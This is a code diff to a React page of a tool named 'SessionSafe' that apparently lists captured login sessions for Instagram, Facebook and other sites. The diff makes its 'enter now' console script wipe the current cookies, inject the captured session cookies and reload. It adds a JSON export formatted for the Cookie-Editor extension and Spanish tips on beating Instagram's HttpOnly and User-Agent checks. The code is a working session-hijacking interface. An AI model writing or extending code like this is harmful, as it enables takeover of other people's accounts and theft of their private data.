@@ -6,7 +6,7 @@ import GlassCard from "@/components/GlassCard";
 import { 
   Search, Clock, Globe, ExternalLink, 
   Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
-  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot, Monitor, Tablet, Smartphone, Info, RefreshCw
+  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot, Monitor, Tablet, Smartphone, Info, RefreshCw, FileJson, Download
 } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 
@@ -38,6 +38,7 @@ export default function SessionsPage() {
   const [loadingCookies, setLoadingCookies] = useState(false);
   const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});
   const [copied, setCopied] = useState(false);
+  const [copiedJson, setCopiedJson] = useState(false);
 
   useEffect(() => {
     fetchSessions();
@@ -126,6 +127,7 @@ export default function SessionsPage() {
   const handleSessionClick = (session: SessionSnapshot) => {
     setSelectedSession(session);
     setCopied(false);
+    setCopiedJson(false);
     fetchCookies(session.id);
   };
 
@@ -136,7 +138,6 @@ export default function SessionsPage() {
   console.clear();
   console.log('%c [SessionSafe] INICIANDO RESTAURACIÓN DEEP ', 'background: #2563eb; color: #fff; font-weight: bold; padding: 5px; border-radius: 3px;');
   
-  // 1. Limpieza agresiva
   console.log('%c [1/3] Limpiando estado previo... ', 'color: #f59e0b;');
   document.cookie.split(";").forEach(function(c) { 
     const name = c.split("=")[0].trim();
@@ -149,29 +150,25 @@ export default function SessionsPage() {
     document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=." + baseDomain;
   });
 
-  // 2. Inyección optimizada
   console.log('%c [2/3] Inyectando ' + cookies.length + ' cookies... ', 'color: #3b82f6;');
   let HttpOnlyCount = 0;
   
   cookies.forEach(c => {
     if (c.http_only) HttpOnlyCount++;
     try {
-      // Usamos el valor directamente para evitar sobre-codificación
       let cookieStr = c.name + '=' + c.value + 
                     '; domain=' + (c.domain.startsWith('.') ? c.domain : ('.' + c.domain)) + 
                     '; path=' + (c.path || '/') + 
                     '; SameSite=Lax; Secure';
       document.cookie = cookieStr;
-    } catch (e) {
-      console.error('Error inyectando:', c.name, e);
-    }
+    } catch (e) {}
   });
 
-  // 3. Verificación y log final
   console.log('%c [3/3] Verificando resultados... ', 'color: #10b981;');
   if (HttpOnlyCount > 0) {
     console.warn('%c [!] ATENCIÓN: Se detectaron ' + HttpOnlyCount + ' cookies HttpOnly. ', 'background: #7c2d12; color: #fbbf24; padding: 3px;');
-    console.warn('Nota: Las cookies HttpOnly (como el sessionid a veces) NO se pueden inyectar desde la consola. Si el login falla, usa la extensión.');
+    console.warn('Nota: Las cookies HttpOnly (como el sessionid) NO se pueden inyectar desde la consola por seguridad del navegador.');
+    console.warn('Usa la opción "Descargar JSON" en el Dashboard e impórtalo en una extensión como "Cookie-Editor".');
   }
 
   console.log('%c ¡CAPTURA COMPLETADA! Recargando en 2s... ', 'background: #10b981; color: #fff; font-weight: bold; padding: 5px;');
@@ -186,6 +183,29 @@ export default function SessionsPage() {
       setCopied(true);
       setTimeout(() => setCopied(false), 5000);
     }).catch(() => prompt("Copia este código:", script));
+  };
+
+  const copyCookiesJson = () => {
+    // Format cookies for common extensions (Cookie-Editor, etc)
+    const formatted = cookies.map(c => ({
+      domain: c.domain.startsWith('.') ? c.domain : '.' + c.domain,
+      expirationDate: c.expiration_date || (Math.floor(Date.now() / 1000) + 86400 * 30),
+      hostOnly: false,
+      httpOnly: c.http_only,
+      name: c.name,
+      path: c.path || "/",
+      sameSite: "no_restriction",
+      secure: c.secure,
+      session: c.is_session,
+      storeId: c.store_id || "0",
+      value: c.value
+    }));
+    
+    const json = JSON.stringify(formatted, null, 2);
+    navigator.clipboard.writeText(json).then(() => {
+      setCopiedJson(true);
+      setTimeout(() => setCopiedJson(false), 5000);
+    });
   };
 
   const getDeviceIcon = (ua?: string) => {
@@ -285,7 +305,7 @@ export default function SessionsPage() {
       <AnimatePresence>
         {selectedSession && (
           <motion.div initial={{ opacity: 0, y: 100 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: 100 }} className="fixed bottom-0 left-0 right-0 p-8 z-50 pointer-events-none">
-            <div className="max-w-5xl mx-auto pointer-events-auto">
+            <div className="max-w-6xl mx-auto pointer-events-auto">
               <GlassCard className="border-t-2 border-blue-500 shadow-2xl bg-black/95 backdrop-blur-3xl px-8 py-8">
                 <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                   <div className="space-y-6">
@@ -312,36 +332,48 @@ export default function SessionsPage() {
                         <div className="flex flex-col items-center justify-center gap-2 p-6 bg-red-500/5 rounded-xl border border-red-500/10 text-center">
                           <Info size={24} className="text-red-400/50" />
                           <p className="text-xs text-gray-400 max-w-[200px]">
-                            Esta sesión es antigua y no tiene User-Agent guardado.
+                            Sesión antigua sin User-Agent guardado.
                           </p>
                         </div>
                       )}
-                      <p className="text-[10px] text-gray-500 mt-3 leading-tight italic">
-                        * Usa la extensión "User-Agent Switcher" con este texto antes de inyectar.
-                      </p>
                     </div>
                   </div>
 
                   <div className="flex flex-col justify-center space-y-4">
                     <div className="flex flex-col gap-3">
-                      <div className="flex items-center gap-2 text-emerald-400 font-bold text-sm px-2">
-                        <Check size={16} /> Ready for restoration ({cookies.length} cookies)
+                      <div className="flex items-center justify-between px-2 text-emerald-400 font-bold text-sm">
+                        <div className="flex items-center gap-2"><Check size={16} /> Ready ({cookies.length} cookies)</div>
+                        {cookies.some(c => c.http_only) && (
+                          <div className="flex items-center gap-1.5 text-amber-400 text-[10px] bg-amber-400/10 px-2 py-1 rounded-lg">
+                            <AlertCircle size={12} /> HttpOnly DETECTADO
+                          </div>
+                        )}
                       </div>
-                      <div className="flex gap-4">
-                        <button onClick={() => setSelectedSession(null)} className="px-8 py-5 rounded-2xl glass font-bold text-gray-400 hover:bg-white/5 transition-all outline-none">
-                          CERRAR
-                        </button>
+                      
+                      <div className="flex flex-col gap-4">
                         <button 
                           onClick={copyToClipboard}
-                          className={"flex-1 flex items-center justify-center gap-3 px-10 py-5 rounded-2xl font-black text-2xl shadow-2xl transition-all active:scale-95 " + (copied ? "bg-emerald-600 scale-[1.02]" : "bg-blue-600 hover:bg-md-blue-500 hover:shadow-blue-500/40")}
+                          className={"w-full flex items-center justify-center gap-3 px-10 py-5 rounded-2xl font-black text-2xl shadow-2xl transition-all active:scale-95 " + (copied ? "bg-emerald-600" : "bg-blue-600 hover:bg-blue-500 border-2 border-blue-400/20")}
                         >
-                          {copied ? <><Check size={28} /> ¡COPIADO!</> : <><Copy size={28} /> ENTRAR AHORA</>}
+                          {copied ? <><Check size={28} /> ¡COPIADO!</> : <><Copy size={28} /> ENTRAR CON CONSOLA</>}
                         </button>
+
+                        <div className="flex gap-3">
+                          <button 
+                            onClick={copyCookiesJson}
+                            className={"flex-1 flex items-center justify-center gap-2 p-4 rounded-2xl glass font-bold text-sm transition-all " + (copiedJson ? "text-emerald-400" : "text-gray-300 hover:bg-white/5")}
+                          >
+                            {copiedJson ? <><Check size={18} /> JSON COPIADO</> : <><FileJson size={18} /> COPIAR JSON (RECOMENDADO)</>}
+                          </button>
+                          <button onClick={() => setSelectedSession(null)} className="px-6 py-4 rounded-2xl glass font-bold text-gray-500 text-sm">
+                            CERRAR
+                          </button>
+                        </div>
                       </div>
                     </div>
                     <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/20">
-                       <p className="text-[11px] text-amber-200/80 leading-snug">
-                         <b>IMPORTANTE:</b> Si después de inyectar te sale un cuadro de "No has iniciado sesión", es porque Instagram detectó el cambio. Asegúrate de tener el **mismo User-Agent** que está a la izquierda.
+                       <p className="text-[11px] text-amber-200/80 leading-snug font-medium">
+                         <b>TIP DE EXPERTO:</b> Instagram usa cookies "HttpOnly" que la Consola no puede tocar. Si al inyectar sigues fuera, copia el **JSON** y usa la extensión **"Cookie-Editor"** (pestaña Import) para entrar al 100%.
                        </p>
                     </div>
                   </div>
